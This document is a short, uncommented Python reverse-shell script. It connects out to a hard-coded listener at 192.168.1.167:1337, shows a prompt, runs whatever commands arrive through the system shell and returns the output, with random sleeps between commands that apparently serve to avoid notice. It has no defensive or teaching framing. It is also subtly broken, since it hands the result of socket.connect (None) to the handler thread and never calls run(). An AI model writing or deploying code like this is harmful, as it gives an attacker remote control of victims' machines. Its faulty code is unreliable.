
 #!/usr/bin/env python3

import sys
import socket
import threading
import subprocess
from time import sleep
from random import randint

def server_loop():
    host = '192.168.1.167'
    port = 1337
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        server_socket = s.connect((host, port))
        server_thread = threading.Thread(
        target=server_handler, args=(
            server_socket, ))
        server_thread.start()

def server_handler(socket_obj):
    while True:
        socket_obj.send(b'<GMP:#> ')
        cmd_buffer = b''
        while b'\n' not in cmd_buffer:
            cmd_buffer += socket_obj.recv(1024)
        if cmd_buffer.strip() == b'EXIT':
            print('\n')
            sys.exit()
        response = run_command(cmd_buffer)
        socket_obj.send(response)
        sleep(randint(10,15))

def run_command(command: str):
        hostname = socket.gethostname()
        host = socket.gethostbyname(hostname)
        command = command.rstrip()
        try:
            output = subprocess.check_output(
                command, stderr=subprocess.STDOUT, shell=True)
        except BaseException:
            output = f'Failed to execute {command} command on {host}:1337.\r\n'.encode()
        return output

def run():
    server_loop()

